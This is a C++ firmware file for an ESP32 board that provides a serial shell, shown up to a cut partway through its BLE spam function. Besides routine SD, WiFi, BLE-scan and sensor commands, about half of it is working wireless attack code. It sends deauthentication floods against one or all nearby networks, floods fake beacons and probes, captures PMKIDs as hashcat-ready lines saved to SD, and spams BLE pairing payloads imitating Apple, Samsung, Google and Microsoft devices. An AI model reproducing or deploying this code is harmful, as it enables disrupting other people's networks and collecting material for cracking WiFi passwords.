#include "SerialShell.h"

#include <FS.h>
#include <NimBLEDevice.h>
#include <SD_MMC.h>
#include <WiFi.h>
#include <esp_ota_ops.h>
#include <esp_private/wifi.h>
#include <esp_random.h>
#include <esp_system.h>
#include <esp_wifi.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>

#include <WaveshareAmoledSensors.h>

#include "BoardConfig.h"

namespace SerialShell {
namespace {

namespace Sensors = WaveshareAmoled::Sensors;

// WiFi STA and NimBLE cannot run hot at the same time on the S3; the shell owns
// at most one radio and tears the other down before switching. Mirrors the
// radio handling in WaveshareCypherboxPort.
enum class Radio { Idle, Wifi, Ble };
Radio radio = Radio::Idle;

const char* radioName() {
  switch (radio) {
    case Radio::Wifi: return "wifi";
    case Radio::Ble: return "ble";
    default: return "idle";
  }
}

void radioWifi() {
  if (radio == Radio::Ble && NimBLEDevice::isInitialized()) {
    NimBLEDevice::deinit(true);
  }
  WiFi.mode(WIFI_STA);
  radio = Radio::Wifi;
}

void radioBle() {
  if (radio == Radio::Wifi) {
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
  }
  radio = Radio::Ble;
}

// ---- scan results cache -----------------------------------------------------
// `wifi scan` fills this so `attack deauth/pmkid <idx>` can target by index.
// Mirrors WaveshareCypherboxPort's WifiNetwork[] (cpp:43).

constexpr uint8_t kMaxNetworks = 24;

struct ScanEntry {
  char ssid[33];
  char bssid[18];
  uint8_t bssidBytes[6];
  int32_t rssi;
  uint8_t channel;
};

ScanEntry scanTable[kMaxNetworks];
uint8_t scanCount = 0;

// ---- attack constants / state (copied from WaveshareCypherboxPort) ----------

constexpr uint8_t kFramesPerBurst = 16;
constexpr uint32_t kPmkidSolicitMs = 1500UL;
constexpr uint32_t kPmkidTimeoutMs = 120000UL;
constexpr uint32_t kAttackTimeoutMs = 60000UL;  // safety cap for flood attacks

struct DeauthFrame {
  uint8_t frameControl[2];
  uint8_t duration[2];
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t accessPoint[6];
  uint8_t fragmentSequence[2];
  uint16_t reason;
} __attribute__((packed));

struct AttackState {
  uint8_t type = 0;
  uint32_t frames = 0;
  uint32_t startedAt = 0;
  uint32_t lastSolicit = 0;
  uint16_t reason = 7;
  uint8_t apMac[6] = {};
  uint8_t selfMac[6] = {};
  uint8_t apList[kMaxNetworks][6] = {};
  uint8_t apChannels[kMaxNetworks] = {};
  uint8_t apCount = 0;
  uint8_t apCursor = 0;
  DeauthFrame deauth = {};
  DeauthFrame disassoc = {};
  bool pmkidFound = false;
  char pmkidSsid[33] = "";
  uint8_t pmkidAp[6] = {};
  uint8_t pmkidSta[6] = {};
  uint8_t pmkid[16] = {};
};

AttackState attack;

// Forward declaration: handleBle() (defined above the spam impl) routes here.
void bleSpam(char* rest);

// ---- lookup tables (data copied from WaveshareCypherboxPort) ----------------

const char* authName(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-EAP";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
    default: return "UNKNOWN";
  }
}

void decodeVendor(const std::string& md, char* out, size_t outLen) {
  out[0] = '\0';
  if (md.size() < 2) return;
  uint16_t company = static_cast<uint8_t>(md[0]) | (static_cast<uint8_t>(md[1]) << 8);
  switch (company) {
    case 0x004C:
      strncpy(out, md.size() >= 3 && static_cast<uint8_t>(md[2]) == 0x12 ? "Apple Find My" : "Apple",
              outLen - 1);
      break;
    case 0x0075: strncpy(out, "Samsung", outLen - 1); break;
    case 0x0006: strncpy(out, "Microsoft", outLen - 1); break;
    case 0x00E0: strncpy(out, "Google", outLen - 1); break;
    default: snprintf(out, outLen, "ID 0x%04X", company); break;
  }
}

// ---- parsing helpers --------------------------------------------------------

// If `cmd` begins with the whole token `word`, returns a pointer past it with
// leading spaces skipped (may point at ""). Returns nullptr otherwise.
char* afterWord(char* cmd, const char* word) {
  const size_t n = strlen(word);
  if (strncmp(cmd, word, n) != 0) return nullptr;
  if (cmd[n] != '\0' && cmd[n] != ' ') return nullptr;
  char* p = cmd + n;
  while (*p == ' ') p++;
  return p;
}

// ---- SD ---------------------------------------------------------------------

// Reuse the launcher's mount sequence. If the card is already mounted (the
// launcher mounts at boot) this is a no-op.
bool ensureSd() {
  if (SD_MMC.cardType() != CARD_NONE) return true;
  SD_MMC.end();
  pinMode(PIN_SD_CLK, INPUT_PULLUP);
  pinMode(PIN_SD_CMD, INPUT_PULLUP);
  pinMode(PIN_SD_D0, INPUT_PULLUP);
  SD_MMC.setPins(PIN_SD_CLK, PIN_SD_CMD, PIN_SD_D0);
  const uint32_t freqs[] = {25000, 20000, 10000, 4000};
  for (uint8_t i = 0; i < sizeof(freqs) / sizeof(freqs[0]); i++) {
    if (SD_MMC.begin("/sdcard", true, false, freqs[i])) return true;
    SD_MMC.end();
    delay(80);
  }
  return false;
}

void sdMount() {
  if (ensureSd()) {
    Serial.printf("sd mounted type=%u size=%llu MB\n", SD_MMC.cardType(),
                  SD_MMC.cardSize() / (1024ULL * 1024ULL));
  } else {
    Serial.println("sd: no card");
  }
}

void sdLs(char* rest) {
  while (*rest == ' ') rest++;
  const char* path = *rest ? rest : "/";
  if (!ensureSd()) {
    Serial.println("sd: no card");
    return;
  }
  File dir = SD_MMC.open(path);
  if (!dir || !dir.isDirectory()) {
    Serial.printf("sd: not a directory: %s\n", path);
    if (dir) dir.close();
    return;
  }
  Serial.printf("sd ls %s\n", path);
  File entry;
  while ((entry = dir.openNextFile())) {
    Serial.printf("  %s%s %lu\n", entry.name(), entry.isDirectory() ? "/" : "",
                  static_cast<unsigned long>(entry.size()));
    entry.close();
  }
  dir.close();
}

void sdCat(char* rest) {
  while (*rest == ' ') rest++;
  if (!*rest) {
    Serial.println("usage: sd cat <path>");
    return;
  }
  if (!ensureSd()) {
    Serial.println("sd: no card");
    return;
  }
  File f = SD_MMC.open(rest, FILE_READ);
  if (!f) {
    Serial.printf("sd: cannot open %s\n", rest);
    return;
  }
  if (f.isDirectory()) {
    Serial.printf("sd: %s is a directory\n", rest);
    f.close();
    return;
  }
  Serial.printf("sd cat %s (%lu bytes)\n", rest, static_cast<unsigned long>(f.size()));
  uint8_t buf[256];
  while (f.available()) {
    const size_t n = f.read(buf, sizeof(buf));
    Serial.write(buf, n);
  }
  Serial.println();
  f.close();
}

void sdDf() {
  if (!ensureSd()) {
    Serial.println("sd: no card");
    return;
  }
  const uint64_t total = SD_MMC.totalBytes();
  const uint64_t used = SD_MMC.usedBytes();
  Serial.printf("sd size=%llu MB total=%llu MB used=%llu MB free=%llu MB\n",
                SD_MMC.cardSize() / (1024ULL * 1024ULL), total / (1024ULL * 1024ULL),
                used / (1024ULL * 1024ULL), (total - used) / (1024ULL * 1024ULL));
}

void handleSd(char* a) {
  if (strcmp(a, "mount") == 0) sdMount();
  else if (afterWord(a, "ls")) sdLs(a + 2);
  else if (afterWord(a, "cat")) sdCat(a + 3);
  else if (strcmp(a, "df") == 0) sdDf();
  else Serial.println("sd: mount | ls [path] | cat <path> | df");
}

// ---- WiFi -------------------------------------------------------------------

void wifiScan() {
  radioWifi();
  Serial.println("wifi scanning...");
  int n = WiFi.scanNetworks(false, true);
  if (n < 0) n = 0;
  scanCount = 0;
  Serial.printf("wifi networks=%d\n", n);
  for (int i = 0; i < n; i++) {
    if (scanCount < kMaxNetworks) {
      ScanEntry& e = scanTable[scanCount];
      strncpy(e.ssid, WiFi.SSID(i).c_str(), sizeof(e.ssid) - 1);
      e.ssid[sizeof(e.ssid) - 1] = '\0';
      strncpy(e.bssid, WiFi.BSSIDstr(i).c_str(), sizeof(e.bssid) - 1);
      e.bssid[sizeof(e.bssid) - 1] = '\0';
      const uint8_t* bs = WiFi.BSSID(i);
      if (bs) memcpy(e.bssidBytes, bs, 6);
      else memset(e.bssidBytes, 0, 6);
      e.rssi = WiFi.RSSI(i);
      e.channel = WiFi.channel(i);
      scanCount++;
    }
    Serial.printf("  %02d ch=%u rssi=%ld auth=%s bssid=%s ssid=\"%s\"\n", i + 1,
                  WiFi.channel(i), static_cast<long>(WiFi.RSSI(i)),
                  authName(static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i))),
                  WiFi.BSSIDstr(i).c_str(),
                  WiFi.SSID(i).length() ? WiFi.SSID(i).c_str() : "(hidden)");
  }
  WiFi.scanDelete();
}

void wifiConnect(char* rest) {
  while (*rest == ' ') rest++;
  if (!*rest) {
    Serial.println("usage: wifi connect <ssid> [password]");
    return;
  }
  char ssid[64];
  char pass[64] = "";
  char* sp = strchr(rest, ' ');
  if (sp) {
    size_t len = static_cast<size_t>(sp - rest);
    if (len >= sizeof(ssid)) len = sizeof(ssid) - 1;
    memcpy(ssid, rest, len);
    ssid[len] = '\0';
    char* p = sp;
    while (*p == ' ') p++;
    strncpy(pass, p, sizeof(pass) - 1);
    pass[sizeof(pass) - 1] = '\0';
  } else {
    strncpy(ssid, rest, sizeof(ssid) - 1);
    ssid[sizeof(ssid) - 1] = '\0';
  }
  radioWifi();
  Serial.printf("wifi connecting to \"%s\"...\n", ssid);
  WiFi.begin(ssid, pass[0] ? pass : nullptr);
  const uint32_t start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 15000) delay(200);
  if (WiFi.status() == WL_CONNECTED) {
    Serial.printf("wifi connected ip=%s rssi=%ld\n", WiFi.localIP().toString().c_str(),
                  static_cast<long>(WiFi.RSSI()));
  } else {
    Serial.printf("wifi connect failed (status=%d)\n", WiFi.status());
  }
}

void wifiStatus() {
  if (WiFi.status() == WL_CONNECTED) {
    Serial.printf("wifi connected ssid=\"%s\" ip=%s rssi=%ld\n", WiFi.SSID().c_str(),
                  WiFi.localIP().toString().c_str(), static_cast<long>(WiFi.RSSI()));
  } else {
    Serial.printf("wifi not connected (radio=%s status=%d)\n", radioName(), WiFi.status());
  }
}

void wifiDisconnect() {
  WiFi.disconnect(true, true);
  Serial.println("wifi disconnected");
}

void handleWifi(char* a) {
  if (strcmp(a, "scan") == 0) wifiScan();
  else if (afterWord(a, "connect")) wifiConnect(a + 7);
  else if (strcmp(a, "status") == 0) wifiStatus();
  else if (strcmp(a, "disconnect") == 0) wifiDisconnect();
  else Serial.println("wifi: scan | connect <ssid> [pass] | status | disconnect");
}

// ---- BLE --------------------------------------------------------------------

void bleScan(char* rest) {
  while (*rest == ' ') rest++;
  uint32_t secs = 5;
  if (*rest) {
    const int v = atoi(rest);
    if (v > 0 && v <= 60) secs = static_cast<uint32_t>(v);
  }
  radioBle();
  if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("Cypher-Cube");
  NimBLEScan* scan = NimBLEDevice::getScan();
  scan->setActiveScan(true);
  Serial.printf("ble scanning %us...\n", secs);
  NimBLEScanResults results = scan->getResults(secs * 1000, false);
  const int count = results.getCount();
  Serial.printf("ble devices=%d\n", count);
  for (int i = 0; i < count; i++) {
    const NimBLEAdvertisedDevice* dev = results.getDevice(i);
    if (!dev) continue;
    char vendor[28] = "";
    if (dev->haveManufacturerData()) {
      decodeVendor(dev->getManufacturerData(0), vendor, sizeof(vendor));
    }
    Serial.printf("  %02d rssi=%d conn=%d addr=%s vendor=\"%s\" name=\"%s\"\n", i + 1,
                  dev->getRSSI(), dev->isConnectable() ? 1 : 0,
                  dev->getAddress().toString().c_str(), vendor,
                  dev->getName().length() ? dev->getName().c_str() : "(no name)");
  }
  scan->clearResults();
}

void bleStatus() {
  Serial.printf("ble %s (radio=%s)\n", NimBLEDevice::isInitialized() ? "initialized" : "off",
                radioName());
}

void handleBle(char* a) {
  if (afterWord(a, "scan")) bleScan(a + 4);
  else if (afterWord(a, "spam")) bleSpam(a + 4);
  else if (strcmp(a, "status") == 0) bleStatus();
  else Serial.println("ble: scan [secs] | spam [vendor] [secs] | status");
}

// ---- sensors ----------------------------------------------------------------

const char* orientName(Sensors::Orientation o) {
  switch (o) {
    case Sensors::OrientFaceUp: return "face-up";
    case Sensors::OrientFaceDown: return "face-down";
    case Sensors::OrientPortrait: return "portrait";
    case Sensors::OrientPortraitInverted: return "portrait-inv";
    case Sensors::OrientLandscapeLeft: return "landscape-left";
    case Sensors::OrientLandscapeRight: return "landscape-right";
    default: return "unknown";
  }
}

void handleSensors() {
  if (Sensors::Battery::available()) {
    Serial.printf("battery %d%% %umV %s%s\n", Sensors::Battery::percent(),
                  Sensors::Battery::voltageMv(),
                  Sensors::Battery::isCharging() ? "charging" : "discharging",
                  Sensors::Battery::isVbusPresent() ? " vbus" : "");
  } else {
    Serial.println("battery: n/a");
  }
  if (Sensors::Rtc::available()) {
    const Sensors::DateTime dt = Sensors::Rtc::now();
    Serial.printf("rtc %04u-%02u-%02u %02u:%02u:%02u\n", dt.year, dt.month, dt.day, dt.hour,
                  dt.minute, dt.second);
  } else {
    Serial.println("rtc: n/a");
  }
  if (Sensors::Imu::available()) {
    Sensors::Vec3 a;
    Sensors::Imu::readAccel(a);
    Serial.printf("imu orient=%s accel=%.2f,%.2f,%.2f g\n", orientName(Sensors::Imu::orientation()),
                  a.x, a.y, a.z);
  } else {
    Serial.println("imu: n/a");
  }
}

// ---- stop / report ----------------------------------------------------------

// Non-blocking: drains serial, returns true when a full line equal to "stop"
// has arrived. Used to break out of the blocking attack/spam loops.
bool serialStop() {
  static char buf[16];
  static uint8_t len = 0;
  while (Serial.available()) {
    const char c = static_cast<char>(Serial.read());
    if (c == '\r') continue;
    if (c == '\n') {
      buf[len] = '\0';
      const bool stop = (strcmp(buf, "stop") == 0);
      len = 0;
      if (stop) return true;
      continue;
    }
    if (len < sizeof(buf) - 1) buf[len++] = c;
    else len = 0;
  }
  return false;
}

// ---- system: info / reboot / rtc set ----------------------------------------

void cmdInfo() {
  Serial.printf("chip %s rev%d cores=%d %luMHz\n", ESP.getChipModel(), ESP.getChipRevision(),
                ESP.getChipCores(), static_cast<unsigned long>(ESP.getCpuFreqMHz()));
  Serial.printf("flash %luMB psram %luKB (free %luKB)\n",
                static_cast<unsigned long>(ESP.getFlashChipSize() / (1024UL * 1024UL)),
                static_cast<unsigned long>(ESP.getPsramSize() / 1024UL),
                static_cast<unsigned long>(ESP.getFreePsram() / 1024UL));
  Serial.printf("heap free=%lu min=%lu\n", static_cast<unsigned long>(ESP.getFreeHeap()),
                static_cast<unsigned long>(ESP.getMinFreeHeap()));
  Serial.printf("mac %s\n", WiFi.macAddress().c_str());
  Serial.printf("idf %s reset-reason=%d\n", ESP.getSdkVersion(), static_cast<int>(esp_reset_reason()));
  const uint32_t s = millis() / 1000UL;
  Serial.printf("uptime %luh%02lum%02lus\n", static_cast<unsigned long>(s / 3600UL),
                static_cast<unsigned long>((s % 3600UL) / 60UL), static_cast<unsigned long>(s % 60UL));
  const esp_partition_t* run = esp_ota_get_running_partition();
  if (run) {
    Serial.printf("running %s @0x%06X size=%uKB\n", run->label, run->address, run->size / 1024);
  }
}

void cmdReboot() {
  Serial.println("rebooting...");
  delay(100);
  ESP.restart();
}

void cmdRtcSet(char* rest) {
  while (*rest == ' ') rest++;
  int y, mo, d, h, mi, s;
  if (sscanf(rest, "%d-%d-%d %d:%d:%d", &y, &mo, &d, &h, &mi, &s) != 6) {
    Serial.println("usage: rtc set <YYYY-MM-DD HH:MM:SS>");
    return;
  }
  Sensors::DateTime dt;
  dt.year = static_cast<uint16_t>(y);
  dt.month = static_cast<uint8_t>(mo);
  dt.day = static_cast<uint8_t>(d);
  dt.hour = static_cast<uint8_t>(h);
  dt.minute = static_cast<uint8_t>(mi);
  dt.second = static_cast<uint8_t>(s);
  dt.valid = true;
  Sensors::Rtc::set(dt);
  Serial.printf("rtc set to %04d-%02d-%02d %02d:%02d:%02d\n", y, mo, d, h, mi, s);
}

void handleRtc(char* a) {
  char* set = afterWord(a, "set");
  if (set) cmdRtcSet(set);
  else Serial.println("rtc: set <YYYY-MM-DD HH:MM:SS>");
}

// ---- WiFi injection attacks (cores copied from WaveshareCypherboxPort) -------

void buildMgmtFrame(DeauthFrame& frame, const uint8_t* dest, const uint8_t* ap, uint8_t subtype,
                    uint16_t reason) {
  memset(&frame, 0, sizeof(frame));
  frame.frameControl[0] = subtype;
  frame.duration[0] = 0x01;
  memcpy(frame.station, dest, 6);
  memcpy(frame.sender, ap, 6);
  memcpy(frame.accessPoint, ap, 6);
  frame.reason = reason;
}

void setupAttackRadio(uint8_t channel) {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel ? channel : 1, WIFI_SECOND_CHAN_NONE);
}

void stopAttack() {
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(false);
}

void sendPmkidSolicit() {
  uint8_t auth[30] = {0};
  auth[0] = 0xB0;
  auth[2] = 0x3A;
  auth[3] = 0x01;
  memcpy(auth + 4, attack.apMac, 6);
  memcpy(auth + 10, attack.selfMac, 6);
  memcpy(auth + 16, attack.apMac, 6);
  auth[26] = 0x01;
  esp_wifi_internal_tx(WIFI_IF_STA, auth, sizeof(auth));
  attack.frames++;

  uint8_t frame[128];
  int n = 0;
  frame[n++] = 0x00; frame[n++] = 0x00;
  frame[n++] = 0x3A; frame[n++] = 0x01;
  memcpy(frame + n, attack.apMac, 6); n += 6;
  memcpy(frame + n, attack.selfMac, 6); n += 6;
  memcpy(frame + n, attack.apMac, 6); n += 6;
  frame[n++] = 0x00; frame[n++] = 0x00;
  frame[n++] = 0x11; frame[n++] = 0x00;
  frame[n++] = 0x0A; frame[n++] = 0x00;
  uint8_t slen = strlen(attack.pmkidSsid);
  if (slen > 32) slen = 32;
  frame[n++] = 0x00; frame[n++] = slen;
  memcpy(frame + n, attack.pmkidSsid, slen); n += slen;
  const uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
  memcpy(frame + n, rates, sizeof(rates)); n += sizeof(rates);
  const uint8_t rsn[] = {
      0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,
      0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
  memcpy(frame + n, rsn, sizeof(rsn)); n += sizeof(rsn);
  esp_wifi_internal_tx(WIFI_IF_STA, frame, n);
  attack.frames++;
}

void IRAM_ATTR pmkidSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  (void)type;
  if (attack.pmkidFound) return;
  wifi_promiscuous_pkt_t* packet = reinterpret_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* p = packet->payload;
  int len = packet->rx_ctrl.sig_len;
  if (len < 36) return;
  if (((p[0] >> 2) & 0x03) != 2) return;
  int hdr = 24;
  if (((p[0] >> 4) & 0x0F) & 0x08) hdr += 2;
  if (memcmp(p + 16, attack.apMac, 6) != 0) return;
  if (len < hdr + 8) return;
  const uint8_t* llc = p + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[6] == 0x88 && llc[7] == 0x8E)) return;
  const uint8_t* eapol = llc + 8;
  int eapolLen = len - (hdr + 8);
  if (eapolLen < 99 || eapol[1] != 0x03) return;
  const uint8_t* key = eapol + 4;
  uint16_t keyInfo = (key[1] << 8) | key[2];
  if (!(keyInfo & 0x0080) || (keyInfo & 0x0100)) return;
  int keyDataLen = (key[93] << 8) | key[94];
  int avail = (eapolLen - 4) - 95;
  if (keyDataLen > avail) keyDataLen = avail;
  const uint8_t* kd = key + 95;
  for (int i = 0; i + 2 <= keyDataLen;) {
    uint8_t id = kd[i];
    uint8_t l = kd[i + 1];
    if (id == 0xDD && l >= 0x14 && i + 22 <= keyDataLen &&
        kd[i + 2] == 0x00 && kd[i + 3] == 0x0F && kd[i + 4] == 0xAC &&
        kd[i + 5] == 0x04) {
      memcpy(attack.pmkid, kd + i + 6, 16);
      memcpy(attack.pmkidAp, p + 10, 6);
      memcpy(attack.pmkidSta, p + 4, 6);
      attack.pmkidFound = true;
      return;
    }
    i += 2 + l;
  }
}

// Print the captured PMKID as a hashcat 22000 line, and save to SD if mounted.
void reportPmkid() {
  static const char* hex = "0123456789abcdef";
  char line[160];
  int n = 0;
  n += snprintf(line + n, sizeof(line) - n, "WPA*01*");
  for (uint8_t i = 0; i < 16; i++) {
    line[n++] = hex[attack.pmkid[i] >> 4];
    line[n++] = hex[attack.pmkid[i] & 0x0F];
  }
  line[n++] = '*';
  for (uint8_t i = 0; i < 6; i++) {
    line[n++] = hex[attack.pmkidAp[i] >> 4];
    line[n++] = hex[attack.pmkidAp[i] & 0x0F];
  }
  line[n++] = '*';
  for (uint8_t i = 0; i < 6; i++) {
    line[n++] = hex[attack.pmkidSta[i] >> 4];
    line[n++] = hex[attack.pmkidSta[i] & 0x0F];
  }
  line[n++] = '*';
  const uint8_t slen = strlen(attack.pmkidSsid);
  for (uint8_t i = 0; i < slen; i++) {
    line[n++] = hex[static_cast<uint8_t>(attack.pmkidSsid[i]) >> 4];
    line[n++] = hex[static_cast<uint8_t>(attack.pmkidSsid[i]) & 0x0F];
  }
  n += snprintf(line + n, sizeof(line) - n, "***");
  Serial.printf("pmkid %s\n", line);
  if (ensureSd()) {
    File f = SD_MMC.open("/pmkid.22000", FILE_APPEND);
    if (f) {
      f.println(line);
      f.close();
      Serial.println("pmkid saved /pmkid.22000");
    }
  }
}

void runAttack(uint8_t type, int idx) {
  uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  memset(&attack, 0, sizeof(attack));
  attack.type = type;
  attack.reason = 7;
  attack.startedAt = millis();
  radioWifi();
  setupAttackRadio(1);

  if (type == 1 || type == 5) {  // deauth target / pmkid: need a scanned target
    if (idx < 0 || idx >= scanCount) {
      Serial.println("attack: invalid index; run 'wifi scan' first");
      stopAttack();
      return;
    }
    memcpy(attack.apMac, scanTable[idx].bssidBytes, 6);
    setupAttackRadio(scanTable[idx].channel);
    if (type == 1) {
      buildMgmtFrame(attack.deauth, broadcast, attack.apMac, 0xC0, attack.reason);
      buildMgmtFrame(attack.disassoc, broadcast, attack.apMac, 0xA0, attack.reason);
    } else {
      strncpy(attack.pmkidSsid, scanTable[idx].ssid, sizeof(attack.pmkidSsid) - 1);
      esp_wifi_get_mac(WIFI_IF_STA, attack.selfMac);
      esp_wifi_set_promiscuous_rx_cb(pmkidSniffer);
    }
  } else if (type == 2) {  // deauth all: build target list from the scan cache
    if (scanCount == 0) {
      Serial.println("attack: no networks; run 'wifi scan' first");
      stopAttack();
      return;
    }
    for (uint8_t i = 0; i < scanCount && attack.apCount < kMaxNetworks; i++) {
      memcpy(attack.apList[attack.apCount], scanTable[i].bssidBytes, 6);
      attack.apChannels[attack.apCount] = scanTable[i].channel ? scanTable[i].channel : 1;
      attack.apCount++;
    }
    setupAttackRadio(attack.apChannels[0]);
  }

  Serial.println("authorized testing only; send 'stop' to end");
  const uint32_t timeout = (type == 5) ? kPmkidTimeoutMs : kAttackTimeoutMs;
  uint32_t lastReport = 0;
  while (!serialStop() && millis() - attack.startedAt < timeout) {
    switch (attack.type) {
      case 1:
        for (uint8_t i = 0; i < kFramesPerBurst; i++) {
          esp_wifi_internal_tx(WIFI_IF_STA, &attack.deauth, sizeof(attack.deauth));
          esp_wifi_internal_tx(WIFI_IF_STA, &attack.disassoc, sizeof(attack.disassoc));
          attack.frames += 2;
        }
        break;
      case 2:
        if (attack.apCount) {
          attack.apCursor = (attack.apCursor + 1) % attack.apCount;
          esp_wifi_set_channel(attack.apChannels[attack.apCursor], WIFI_SECOND_CHAN_NONE);
          buildMgmtFrame(attack.deauth, broadcast, attack.apList[attack.apCursor], 0xC0, attack.reason);
          buildMgmtFrame(attack.disassoc, broadcast, attack.apList[attack.apCursor], 0xA0, attack.reason);
          for (uint8_t i = 0; i < kFramesPerBurst; i++) {
            esp_wifi_internal_tx(WIFI_IF_STA, &attack.deauth, sizeof(attack.deauth));
            esp_wifi_internal_tx(WIFI_IF_STA, &attack.disassoc, sizeof(attack.disassoc));
            attack.frames += 2;
          }
        }
        break;
      case 3: {
        const char* names[] = {"FreePublicWiFi", "Guest", "Airport_Free", "Hotel_Guest",
                               "Coffee_WiFi", "Conference", "xfinitywifi", "Public_Hotspot"};
        for (uint8_t i = 0; i < 8; i++) {
          uint8_t beacon[128] = {};
          uint8_t mac[6];
          esp_fill_random(mac, 6);
          beacon[0] = 0x80;
          memset(beacon + 4, 0xff, 6);
          memcpy(beacon + 10, mac, 6);
          memcpy(beacon + 16, mac, 6);
          beacon[32] = 0x64;
          beacon[34] = 0x10;
          beacon[37] = strlen(names[i]);
          memcpy(beacon + 38, names[i], beacon[37]);
          esp_wifi_internal_tx(WIFI_IF_STA, beacon, sizeof(beacon));
          attack.frames++;
        }
        break;
      }
      case 4: {
        uint8_t probe[64] = {};
        uint8_t mac[6];
        esp_fill_random(mac, 6);
        const char* target = "FreePublicWiFi";
        probe[0] = 0x40;
        memset(probe + 4, 0xff, 6);
        memcpy(probe + 10, mac, 6);
        probe[19] = strlen(target);
        memcpy(probe + 20, target, probe[19]);
        for (uint8_t i = 0; i < 10; i++) {
          esp_wifi_internal_tx(WIFI_IF_STA, probe, sizeof(probe));
          attack.frames++;
        }
        break;
      }
      case 5:
        if (!attack.pmkidFound && millis() - attack.lastSolicit >= kPmkidSolicitMs) {
          sendPmkidSolicit();
          attack.lastSolicit = millis();
        }
        if (attack.pmkidFound) {
          reportPmkid();
        }
        break;
    }
    if (attack.type == 5 && attack.pmkidFound) break;
    if (millis() - lastReport >= 1000) {
      lastReport = millis();
      Serial.printf("  frames=%lu\n", static_cast<unsigned long>(attack.frames));
    }
    delay(40);
  }

  stopAttack();
  if (type == 5 && !attack.pmkidFound) Serial.println("pmkid: not captured");
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  radio = Radio::Idle;
  Serial.printf("attack stopped frames=%lu\n", static_cast<unsigned long>(attack.frames));
}

// Parse a 1-based scan index (as printed by `wifi scan`); returns 0-based or -1.
int parseIndex(char* rest) {
  while (*rest == ' ') rest++;
  if (!*rest) {
    Serial.println("attack: missing index; run 'wifi scan' and pass the listed number");
    return -1;
  }
  const int v = atoi(rest);
  if (v < 1 || v > scanCount) {
    Serial.printf("attack: index out of range (1..%u)\n", scanCount);
    return -1;
  }
  return v - 1;
}

void handleAttack(char* a) {
  if (strcmp(a, "deauth-all") == 0) {
    runAttack(2, -1);
  } else if (strcmp(a, "beacon") == 0) {
    runAttack(3, -1);
  } else if (strcmp(a, "probe") == 0) {
    runAttack(4, -1);
  } else if (afterWord(a, "deauth")) {
    const int idx = parseIndex(a + 6);
    if (idx >= 0) runAttack(1, idx);
  } else if (afterWord(a, "pmkid")) {
    const int idx = parseIndex(a + 5);
    if (idx >= 0) runAttack(5, idx);
  } else {
    Serial.println("attack: deauth <idx> | deauth-all | beacon | probe | pmkid <idx>");
  }
}

// ---- BLE spam (cores copied from WaveshareCypherboxPort) ---------------------

void randomizeBleAddress() {
  uint8_t addr[6];
  esp_fill_random(addr, 6);
  addr[5] |= 0xC0;
  NimBLEDevice::setOwnAddr(addr);
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
}

void buildBleSpam(uint8_t vector, NimBLEAdvertisementData& data) {
  if (vector == 0) {
    uint8_t payload[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0xe6, 0x55};
    for (uint8_t i = 10; i < sizeof(payload); i++) payload[i] = random(256);
    data.addData(payload, sizeof(payload));
  } else if (vector == 1) {
    uint8_t payload[] = {0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21,
                         0x01, 0x09, 0x01, 0x00, 0x00, 0x06, 0x3c, 0x94, 0x8e, 0, 0, 0, 0, 0xc7, 0};
    data.addData(payload, sizeof(payload));
  } else if (vector == 2) {
    data.setFlags(0x06);
    uint8_t model[3] = {0xCD, 0x82, 0x56};
    data.setServiceData(NimBLEUUID(static_cast<uint16_t>(0xFE2C)), model, sizeof(model));
  } else {
    const char* name = "Keyboard";
    uint8_t payload[24];
    int n = 0;
    payload[n++] = strlen(name) + 6;
    payload[n++] = 0xff;
    payload[n++] = 0x06; payload[n++] = 0x00;
    payload[n++] = 0x03; payload[n++] = 0x00; payload[n++] = 0x80;
    memcpy(payload + n, name, strlen(name)); n += strlen(name);
    data.addData(payload, n);
  }
}

void bleSpam(char* rest) {
  while (*rest == ' ') rest++;
  uint8_t vector = 4;  // 0=apple 1=samsung 2=google 3=microsoft 4=all
  uint32_t secs = 30;
  char a1[16] = "";
  char a2[16] = "";
  sscanf(rest, "%15s %15s", a1, a2);
  if (a1[0]) {
    if (strcmp(a1, "apple") == 0) vector = 0;
    else if (strcmp(a1, "samsung") == 0) vector = 1;
    else if (strcmp(a1, "google") == 0) vector = 2;
    else if (strcmp(a1, "microsoft") == 0) vector = 3;
    else if (strcmp(a1, "all") == 0) vector = 4;
    else { const int v = atoi(a1); if (v > 0) secs = static_cast<uint32_t>(v); }
  }
  if (a2[0]) { const int v = atoi(a2); if (v > 0) secs = static_cast<uint32_t>(v); }
  if (secs > 300) secs = 300;

  radioBle();
  if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
  NimBLEDevice::setPower(9);
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
